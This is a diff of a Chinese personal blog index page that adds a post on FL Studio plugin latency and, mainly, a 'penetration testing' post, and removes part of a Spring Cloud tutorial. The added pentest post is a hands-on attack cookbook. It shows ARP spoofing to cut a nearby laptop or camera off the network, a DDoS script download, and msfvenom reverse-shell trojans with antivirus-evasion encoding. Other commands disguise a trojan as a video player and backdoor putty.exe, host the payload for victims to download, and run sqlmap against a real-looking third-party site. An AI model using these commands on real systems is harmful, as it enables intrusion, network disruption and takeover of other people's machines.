@@ -48,6 +48,196 @@
     
         <article class="post article-entry">
             <div class="post-title">
+                <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2024/02/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BAPR%E6%96%AD%E7%BD%91/">渗透测试之APR断网</a>
+            </div>
+            <p class="sub">Feb 27 2024</p>
+            <div class="post-content">
+                
+                    <p>在kaili中，可以通过nmap扫描路由下存活主机和它开放的端口，之后可以通过攻击目标主机IP和网关实现断网攻击</p>
+<p>比如当你链接一个网络，首先在本地查询当前网络的网关，然后扫描网关下存活的主机，最后通过主机IP实现攻击</p>
+<h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>前言<br>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p>
+<p>一句话解释： 断网攻击用使用ARPspoof工具，欺骗设备，截断网关和被攻击主机之间的正常通信</p>
+<p>请勿用于违法用途！</p>
+<p>首先进入root用户<br>执行命令，然后输入你装系统的时候的密码，然后按Enter键</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
+
+<p>使用ipconfig查看自己网卡名称和网关。<br>例如我的网卡叫eth0。注意不要选错了，笔记本电脑有无线网卡和有线网卡，有线网卡一般叫eth0，有线网卡一般叫lo之类的名字。确认好你正在用什么方式联网，是网线还是WiFi，WiFi就是无线网卡，插网线就是有线网卡</p>
+<p>查看网关，你和被攻击主机在同一个网络下，所以你的网关和被攻击主机的网关是一样的</p>
+<p>其实如果你能看到路由器的话，也可以直接去看路由器管理页面的网址，一般是192.168.0.1，这个网址就是网关地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p>使用nmap工具扫描设备<br>查看被攻击主机的IP地址，然后稍等片刻，扫描结果就会出来，命令格式是这样的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 你网关IP地址-200</span><br></pre></td></tr></table></figure>
+
+<p>比如我的网关是192.168.0.1 ，我的命令应该这样写</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.1-200</span><br></pre></td></tr></table></figure>
+
+<p>然后扫出来一些设备，在这些设备里面找你的攻击目标的IP地址</p>
+<p>图为我的网关，和我电脑的ip地址，被攻击设备的ip我就不展示了。</p>
+<p>你在输出内容里面能看到网关，自己电脑IP，被攻击主机IP</p>
+<p>开始攻击<br>现在开始攻击，命令的格式是这样的，你刚刚已经把被攻击主机ip和网关的ip查好了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t  被攻击主机ip  网关</span><br></pre></td></tr></table></figure>
+
+<p>例如我想给我边上的笔记本电脑断网，那我就加上它的ip和网关，注意中间有空格</p>
+<p>比如笔记本电脑的IP是192.168.0.102，网关是192.168.0.1</p>
+<p>arpspoof -i eth0 -t    192.168.1.102 192.168.0.1   </p>
+<p>这样就可以断掉笔记本电脑的网络了</p>
+<p>ARP攻击可以用于各种设备，我试过家里联网的能远程查看的监控也可以被攻击，亲手断过它的网，因为不喜欢被监视，(<em>^▽^</em>)</p>
+<p>大家家里有没有监控呢？</p>
+<p>如果有问题，欢迎请加入Skype群探讨！<br>————————————————</p>
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/albertensterin/article/details/128510328">https://blog.csdn.net/albertensterin/article/details/128510328</a></p>
+<h2 id="后续清理"><a href="#后续清理" class="headerlink" title="后续清理"></a>后续清理</h2><p>一旦停止ARP欺骗攻击，网络不会立即恢复正常状态。由于ARP缓存中可能已经存储了虚假的映射关系，因此需要一定时间才能够自动清除这些错误的ARP条目并重新建立正确的映射。</p>
+<p>在某些情况下，受影响的主机可能需要等待一段时间才能够恢复到正常状态。但通常情况下，网络会随着时间的推移逐渐恢复正常。如果需要更快地恢复网络状态，可以尝试执行以下操作：</p>
+<ol>
+<li>在受影响的主机上手动清除ARP缓存。</li>
+<li>重启受影响的设备，以便清除错误的ARP缓存。</li>
+</ol>
+<p>在进行安全测试时，请务必小心谨慎，并且确保拥有适当的授权。</p>
+<p>清除ARP缓存可以通过以下方法进行：</p>
+<p>在Windows上，可以打开命令提示符并执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -d *</span><br></pre></td></tr></table></figure>
+
+<p>这将删除系统中所有已知的ARP条目。</p>
+<p>在Linux上，可以打开终端并以root权限执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip neigh flush all</span><br></pre></td></tr></table></figure>
+
+<p>这将清除系统中所有的邻居（包括ARP）缓存。</p>
+<p>请注意，在执行这些命令时，可能会导致一些网络连接中断，因此请谨慎操作。</p>
+<h2 id="快速复制"><a href="#快速复制" class="headerlink" title="快速复制"></a>快速复制</h2><p>shenglang</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.2.35  192.168.2.1  </span><br></pre></td></tr></table></figure>
+
+<p>使用nmap 可以扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap [ip]</span><br></pre></td></tr></table></figure>
+
+<p>使用nmap -o 查询主机系统信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -o [ip]</span><br></pre></td></tr></table></figure>
+
+<p>查询网关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP [ip]</span><br></pre></td></tr></table></figure>
+
+<p>扫描当前子网下的所有存活主机 比如你的ip是192.168.2.21 你想要扫描你这个网络下的所有Ip你可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.2.0/24</span><br></pre></td></tr></table></figure>
+
+
+
+<p>34 35 37 38 39 40 43 46 53 64 36</p>
+<p>192.168.2.34</p>
+<p>192.168.2.39 是一个存活主机 win10</p>
+<p>arpspoof -i eth0 -t 192.168.2.37  192.168.2.1  </p>
+<h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>我已经提前再kali下载了脚本所以直接进入 ddos 文件夹内 使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ddos-p3.py</span><br></pre></td></tr></table></figure>
+
+<p>如果没有下载可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Andysun06/ddos</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a>远控木马</h2><p>msfvenom</p>
+<p>链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/11756544.html">https://www.cnblogs.com/Cl0ud/p/11756544.html</a></p>
+<p>生成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></table></figure>
+
+<p>LHOST就是你kali的ip地址，LPORT就是想要让kali监听用哪一个端口来监听这个shell，然后将这个生成的exe文件输出到当前目录下Cl0ud.exe</p>
+<p>比如</p>
+<p>开启metasploit框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>生成木马 msf5的生成代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -p windows/meterpreter/reverse_tcp LHOST=192.168.2.36 LPORT=1234 -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></table></figure>
+
+<p>msf6:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.2.36 LPORT=1234 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>不容易被免杀的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.36 LPORT=1234 -b &quot;\x00&quot; -e x64/xor_dynamic -i 10 -f exe -o /var/www/html/西瓜影音.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53030229/article/details/116751107">https://blog.csdn.net/qq_53030229/article/details/116751107</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="生成针对win10的反弹shell"><a href="#生成针对win10的反弹shell" class="headerlink" title="生成针对win10的反弹shell"></a>生成针对win10的反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.36 lport=1234 -f exe &gt;jiami.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这个解释一下</span><br><span class="line">msfvenom 生成木马</span><br><span class="line">-p 这个的意思是 payload，意思是攻击载荷，简单的说，生成怎么样的攻击模块</span><br><span class="line">windows不用解释了吧</span><br><span class="line">meterpreter/reverse_tcp   反弹shell的意思，就是提权的意思</span><br><span class="line">lhost=本地IP</span><br><span class="line">lport=本地端口</span><br><span class="line">-f 输出格式 例如苹果的MAC你就要输出的是dmg的格式</span><br><span class="line">exe是windows的软件方式</span><br><span class="line">&gt;muma.exe 生成软件为muma.exe</span><br></pre></td></tr></table></figure>
+
+<p>木马放到apache下，然后windows才能访问才能下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp muma.exe /var/www/html/</span><br><span class="line">把这个复制到网站服务器下面去</span><br></pre></td></tr></table></figure>
+
+<p>如果需要生成shellCode可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.44 lport=4444 --encrypt base64 -f c</span><br></pre></td></tr></table></figure>
+
+<p>运行监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.2.44</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 1234</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>开始网站服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+
+<p>关闭网站服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br></pre></td></tr></table></figure>
+
+<p>这时候再同一网络的浏览器访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.44/hello.exe</span><br></pre></td></tr></table></figure>
+
+<p>就可以自动下载，由于没有免杀所以会被排除</p>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><strong>1、查看ssh状态</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、重启、开启、关闭ssh</strong></p>
+<p>重启ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+
+<p>开启ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure>
+
+<p>关闭ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh stop</span><br></pre></td></tr></table></figure>
+
+<h2 id="msf自捆绑编码"><a href="#msf自捆绑编码" class="headerlink" title="msf自捆绑编码"></a>msf自捆绑编码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.36 LPORT=1234 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o pentest4.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看磁盘情况"><a href="#查看磁盘情况" class="headerlink" title="查看磁盘情况"></a>查看磁盘情况</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
+
+<h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><h2 id="slqmap"><a href="#slqmap" class="headerlink" title="slqmap"></a>slqmap</h2><p>当程序有防get注入的时候，可以使用cookie注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.bjxhyn.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+
+                
+            </div>
+        </article>
+    
+        <article class="post article-entry">
+            <div class="post-title">
+                <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2024/02/06/FL%E7%BC%96%E6%9B%B2%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">FL编曲遇到的问题及解决办法</a>
+            </div>
+            <p class="sub">Feb 06 2024</p>
+            <div class="post-content">
+                
+                    <p>w</p>
+<h2 id="VST插件有延迟"><a href="#VST插件有延迟" class="headerlink" title="VST插件有延迟"></a>VST插件有延迟</h2><p>当VST插件有延迟是因为这是插件自己自带的延迟可以在调音台下方的秒表那里更改延迟</p>
+<p>目前使用的Ample Gutart就有延迟只需要往前100ms就可以了</p>
+<p>参考视频：【【编曲教程】如何解决音源延迟问题？】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1gq4y1x7fb?vd_source=4f3b9d011ebcf141b336e0bb16e316be">https://www.bilibili.com/video/BV1gq4y1x7fb?vd_source=4f3b9d011ebcf141b336e0bb16e316be</a></p>
+<p>参考文本：左下角，有一个括号括住的小时钟，如果没有的话，左下角然后右键之后把延迟补偿选上</p>
+
+                
+            </div>
+        </article>
+    
+        <article class="post article-entry">
+            <div class="post-title">
                 <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2024/02/06/%E4%B9%90%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">乐理学习笔记</a>
             </div>
             <p class="sub">Feb 06 2024</p>
@@ -230,250 +420,6 @@
 <p>一切的原因都是因为那个可以复活他人的秘术，为了秘术一家人死亡，留下的只有痛苦和悔恨。</p>
 <p>我们所扮演的人本就一无所知，是阴阳师晴曼的灵魂，附生在了兴家身上，而我们接触到诅咒后记忆也不断被唤醒，随着灵魂不断穿越时空，了解故事，最终终止庆典，来让一切回复平静。</p>
 <p>一说到Meta元素，不得不提到<strong>ever17</strong>，虽然是老游戏，前期很劝退，但只要不断了解故事剧情，之后的故事会非常精彩，对于<strong>第三视点</strong>的理解和互动，让人久久不能忘怀。</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post article-entry">
-            <div class="post-title">
-                <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2024/01/03/springcloud%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">springcloud学习笔记</a>
-            </div>
-            <p class="sub">Jan 03 2024</p>
-            <div class="post-content">
-                
-                    <p><img src="/Blackcat-loveBlog/png/springcloud.png"></p>
-<p>Spring Cloud是一个基于Spring Boot的微服务架构，它提供了一整套的开发工具包，包括服务治理、服务注册与发现、负载均衡、数据监控、REST API发布等，基本涵盖了分布式框架所需要的所有功能。</p>
-<p>使用Spring Cloud的原因主要有以下几点：</p>
-<ol>
-<li>简化开发：Spring Cloud利用Spring Boot的开发便利性，简化了分布式系统基础设施的开发。它提供了一系列的工具，如配置管理、服务发现、断路器、路由、微代理、事件总线等，这些都可以用Spring Boot的开发风格做到一键启动和部署。</li>
-<li>易于维护：Spring Cloud的各个组件都是高度抽象和封装的，这使得它在处理复杂系统时能够提供更清晰、更易于维护的代码结构。</li>
-<li>快速部署：由于Spring Cloud是基于微服务架构的，因此每个服务都可以独立地进行开发和部署，这大大提高了开发效率和系统的可扩展性。</li>
-<li>高度可扩展：由于微服务架构的特点，Spring Cloud可以轻松地扩展服务以处理更多的流量或增加更多的功能，而不会影响整个系统的稳定性。</li>
-<li>安全性高：Spring Cloud提供了强大的安全保障，包括服务认证、访问控制和数据加密等功能，可以有效地保护系统的安全性和隐私性。</li>
-</ol>
-<h1 id="部署Spring-Cloud项目"><a href="#部署Spring-Cloud项目" class="headerlink" title="部署Spring Cloud项目"></a>部署Spring Cloud项目</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>首先创建一个Spring Cloud项目，本次部署环境为</p>
-<p>IDEA.2023</p>
-<p>JAVA 1.8</p>
-<p>java 21 (这个版本是用来创建 创建完成后降级)</p>
-<p>apache-maven-3.8.1-bin</p>
-<p>有关Macen的部署和使用不再赘述</p>
-<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>如果是使用的是官方源创建<a target="_blank" rel="noopener" href="https://start.spring.io/">https://start.spring.io</a></p>
-<p>可能会提示JDK版本太低，这时候你可以选择使用阿里云源创建，里面有低版本的配置</p>
-<p>阿里云源:<a target="_blank" rel="noopener" href="https://start.aliyun.com/">https://start.aliyun.com/</a></p>
-<p>注意:使用低版本部署可能会出现pom.xml里没有parent</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这种情况建议使用高版本创建然后降级使用</p>
-<p>创建完成后进入配置依赖勾选<strong>lombok</strong>，然后确保你的IDEA里下载了<strong>lombok插件</strong>一般<strong>默认自带</strong></p>
-<p>创建完成后正式进入部署环节</p>
-<p>tip:可以删除不需要的文件夹来让项目整体更容易阅读，推荐<strong>删除父模块的src文件夹</strong></p>
-<p><img src="/Blackcat-loveBlog/png/cloud1.png"></p>
-<p>一个SpringCloud项目可能具有多个模块，右键你的父模块可以同时创建多个子模块</p>
-<p>比如我们创建一个eureka模块</p>
-<p>同样的创建操作，这次不需要勾选<strong>lombok</strong></p>
-<p>创建完成后再父模块的pom里需要进行修改</p>
-<p>首先就是将你刚刚创建的子模块链接到父模块</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    模块导入--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="使用Cloud微服务框架"><a href="#使用Cloud微服务框架" class="headerlink" title="使用Cloud微服务框架"></a>使用Cloud微服务框架</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>通过在父pom里添加dependencyManagement声明依赖的管理策略来实现搭建Cloud</p>
-<p><code>&lt;dependencyManagement&gt;</code> 是 Maven 的一个配置元素，用于声明项目依赖的管理策略。这个元素通常出现在 Maven 项目的 <code>pom.xml</code> 文件的 <code>&lt;dependencies&gt;</code> 元素之前。</p>
-<p>通过 <code>&lt;dependencyManagement&gt;</code>，您可以定义一组通用的依赖项，这些依赖项将应用于项目中的所有模块（如果这些模块没有定义自己的依赖项）。这使得您可以在多个模块之间共享相同的依赖版本，从而确保整个项目的一致性。</p>
-<p>然后你需要修改一些配置让项目能准确识别</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">父模块的pom</span><br><span class="line"><span class="comment">&lt;!--    父亲--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    自己--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    这里需要加pom--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        使用cloud需要导入相关--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring-cloud.version</span>&gt;</span>Hoxton.SR1<span class="tag">&lt;/<span class="name">spring-cloud.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>一下是这些代码的说明,方便理解</p>
-<ol>
-<li><strong>父依赖管理</strong> (<code>&lt;parent&gt;</code>)：<ul>
-<li><code>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</code>: 指定父依赖的组ID，这里是Spring Boot的组ID。</li>
-<li><code>&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</code>: 指定父依赖的构件ID，这是一个Spring Boot的父POM文件，它包含了所有Spring Boot项目的默认设置。</li>
-<li><code>&lt;version&gt;2.2.0.RELEASE&lt;/version&gt;</code>: 指定父依赖的版本号。</li>
-<li><code>&lt;relativePath/&gt;</code>: 父POM文件的位置。这里为空意味着Maven将尝试在仓库中查找该父POM文件。</li>
-</ul>
-</li>
-<li><strong>项目信息</strong> (<code>&lt;groupId&gt;</code>, <code>&lt;artifactId&gt;</code>, <code>&lt;version&gt;</code>, <code>&lt;name&gt;</code>, <code>&lt;description&gt;</code>)：<ul>
-<li><code>&lt;groupId&gt;com.example&lt;/groupId&gt;</code>: 指定项目所属的组织或公司的标识符。</li>
-<li><code>&lt;artifactId&gt;springcloud&lt;/artifactId&gt;</code>: 指定项目的名称。</li>
